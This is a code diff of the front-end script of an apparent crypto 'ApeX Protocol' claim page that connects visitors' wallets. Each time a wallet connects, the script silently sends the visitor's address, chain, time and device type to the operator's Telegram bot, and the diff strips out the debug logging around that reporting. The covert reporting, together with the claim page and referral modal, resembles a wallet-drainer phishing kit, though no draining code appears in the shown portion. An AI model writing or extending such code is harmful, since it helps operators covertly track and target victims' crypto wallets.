@@ -66,19 +66,11 @@ import { CONFIG } from './config.js';
   // ============================================================
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
 
-  console.log('📱 Telegram Config:', {
-    botToken: TELEGRAM_BOT_TOKEN ? '✅ Present' : '❌ Missing',
-    chatId: TELEGRAM_CHAT_ID ? '✅ Present' : '❌ Missing',
-  });
-
   async function sendTelegramNotification(message) {
-    console.log('📤 Attempting to send Telegram notification...');
-    
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('❌ Telegram credentials missing!');
-      return;
+      console.warn('⚠️ Telegram credentials missing');
+      return false;
     }
-
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const payload = {
@@ -86,46 +78,34 @@ import { CONFIG } from './config.js';
         text: message,
         parse_mode: 'HTML'
       };
-
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-
-      const responseText = await response.text();
-      console.log('📨 Telegram Response:', response.status, responseText);
-
+      const result = await response.json();
       if (!response.ok) {
-        console.error('❌ Telegram API Error:', responseText);
-      } else {
-        console.log('✅ Telegram notification sent successfully!');
+        console.error('❌ Telegram send error:', result);
+        return false;
       }
+      console.log('✅ Telegram notification sent successfully');
+      return true;
     } catch (e) {
       console.error('❌ Telegram notification failed:', e);
+      return false;
     }
   }
 
-  window.testTelegram = async function(msg) {
-    await sendTelegramNotification(msg || '🧪 Test message from ApeX Protocol at ' + new Date().toISOString());
-  };
-
   // ============================================================
-  //  WEBSOCKET CHECK (skip on desktop to avoid delays)
+  //  WEBSOCKET CHECK
   // ============================================================
-  async function checkWebSocket(retries = 1, delay = 500) {
-    // Skip WebSocket check on desktop to reduce connection time
-    if (isDesktop()) {
-      logDebug('⏭️ Skipping WebSocket check on desktop');
-      return true;
-    }
-    
+  async function checkWebSocket(retries = 2, delay = 500) {
     for (let i = 0; i < retries; i++) {
       try {
         logDebug(`WebSocket check attempt ${i+1}/${retries}`)
         const result = await new Promise((resolve) => {
           const ws = new WebSocket('wss://relay.walletconnect.com')
-          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 3000)
+          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 2000)
           ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true) }
           ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false) }
         })
@@ -139,8 +119,8 @@ import { CONFIG } from './config.js';
         await new Promise(r => setTimeout(r, delay))
       }
     }
-    logDebug('⚠️ WebSocket check failed – proceeding anyway')
-    return true
+    logDebug('❌ WebSocket connection failed after retries')
+    return false
   }
 
   // ============================================================
@@ -212,11 +192,16 @@ import { CONFIG } from './config.js';
   const connectButton = document.getElementById('connectButton')
   const walletButton = document.getElementById('walletButton')
   const claimStatus = document.getElementById('claimStatus')
+  const announcementModal = document.getElementById('announcementModal')
+  const announcementOkBtn = document.getElementById('announcementOkBtn')
+  const referralLink = document.getElementById('referralLink')
+  
   let currentSession = null
   let client, modal, SignClient, WalletConnectModal, EthereumProvider
   let web3Instance = null
   let contractInstance = null
   let isConnecting = false
+  let telegramEnabled = true
 
   // ============================================================
   //  UI STATE MANAGEMENT
@@ -309,6 +294,37 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
+  //  SHOW ANNOUNCEMENT MODAL (WORKS ON BOTH PC & MOBILE)
+  // ============================================================
+  function showAnnouncementModal(address) {
+    if (!announcementModal) return
+    
+    if (address && referralLink) {
+      const shortAddress = address.substring(0, 6) + '...' + address.substring(38)
+      referralLink.textContent = `https://apex-protocol.io/ref?user=${shortAddress}`
+    }
+    
+    announcementModal.classList.add('active')
+    
+    // Auto-hide on mobile after 10 seconds (optional)
+    if (isMobile()) {
+      setTimeout(() => {
+        hideAnnouncementModal()
+      }, 10000)
+    }
+  }
+
+  function hideAnnouncementModal() {
+    if (announcementModal) {
+      announcementModal.classList.remove('active')
+    }
+  }
+
+  if (announcementOkBtn) {
+    announcementOkBtn.addEventListener('click', hideAnnouncementModal)
+  }
+
+  // ============================================================
   //  INITIAL BUTTON STATE
   // ============================================================
   setButtonState(connectButton, 'normal')
@@ -355,7 +371,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  UI UPDATE WITH CHAIN BADGE + TELEGRAM
+  //  UI UPDATE WITH CHAIN BADGE & TELEGRAM + MODAL
   // ============================================================
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect')
@@ -407,17 +423,24 @@ import { CONFIG } from './config.js';
     showStatus(`Connected to ${chainLabel}`, 'success')
 
     // ====== SEND TELEGRAM NOTIFICATION ======
-    console.log('🔔 Sending Telegram notification for wallet connection...');
     const msg = `
 🔗 <b>New Wallet Connected</b>
 📌 <b>Chain:</b> ${chainLabel}
 👤 <b>Address:</b> <code>${address}</code>
 🕒 <b>Time:</b> ${new Date().toLocaleString()}
 📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
-🌐 <b>Platform:</b> ${getPlatform()}
     `.trim()
     
-    sendTelegramNotification(msg);
+    sendTelegramNotification(msg).then(success => {
+      if (!success) {
+        console.warn('⚠️ Telegram notification failed, check bot token and chat ID')
+      }
+    })
+
+    // ====== SHOW ANNOUNCEMENT MODAL (PC & MOBILE) ======
+    setTimeout(() => {
+      showAnnouncementModal(address)
+    }, 1500)
   }
 
   function resetConnectedUI() {
@@ -428,6 +451,7 @@ import { CONFIG } from './config.js';
     showStatus('Wallet disconnected', 'info')
     web3Instance = null
     contractInstance = null
+    hideAnnouncementModal()
   }
 
   // ============================================================
@@ -552,7 +576,8 @@ import { CONFIG } from './config.js';
       logDebug(`🔄 Initializing with projectId: ${projectId}`)
     }
 
-    await checkWebSocket(1, 500)
+    const wsOk = await checkWebSocket(2, 500)
+    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway')
 
     try {
       client = await SignClient.init({
@@ -594,11 +619,11 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  DIRECT EVM CONNECTION (with longer timeout)
+  //  DIRECT EVM CONNECTION (PC only)
   // ============================================================
-  async function connectDirectEVM(timeoutMs = 8000) {
+  async function connectDirectEVM(timeoutMs = 5000) {
     setupEIP6963()
-    await new Promise(r => setTimeout(r, 800))
+    await new Promise(r => setTimeout(r, 600))
 
     let providers = evmProviders.filter(p => p.provider)
     if (providers.length === 0 && window.ethereum) {
@@ -651,6 +676,9 @@ import { CONFIG } from './config.js';
       }
     } catch (err) {
       logDebug(`Direct EVM error: ${err.message}`)
+      if (err.message === 'Connection timeout') {
+        logDebug('Direct EVM timed out, will fallback')
+      }
       if (err.code === 4001) {
         logDebug('User rejected direct connection')
       }
@@ -660,7 +688,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  WALLETCONNECT EVM CONNECTION (5 minute timeout)
+  //  WALLETCONNECT EVM CONNECTION – timeout 5 minutes
   // ============================================================
   async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
     if (isConnecting) {
@@ -907,6 +935,7 @@ import { CONFIG } from './config.js';
     logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`)
 
     if (isMobile()) {
+      // Mobile: WalletConnect ONLY
       logDebug('📱 Mobile: WalletConnect only')
       success = await connectViaWalletConnect(false, 300000)
       if (!success) {
@@ -929,9 +958,10 @@ import { CONFIG } from './config.js';
       return
     }
 
+    // Desktop: EVM first
     logDebug('🖥️ Desktop: EVM connection only')
 
-    success = await connectDirectEVM(8000)
+    success = await connectDirectEVM(5000)
     if (success) {
       logDebug('✅ Desktop: Direct EVM success')
       setButtonState(connectButton, 'connected')
@@ -1242,7 +1272,4 @@ import { CONFIG } from './config.js';
 
   logDebug(`✅ main.js fully initialised – EVM-first, delayed Solana/Bitcoin`)
   logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`)
-  
-  console.log('✅ main.js loaded with Telegram debugging enabled');
-  console.log('📱 To test Telegram, run: testTelegram("Hello from ApeX") in console');
-})()
+})();
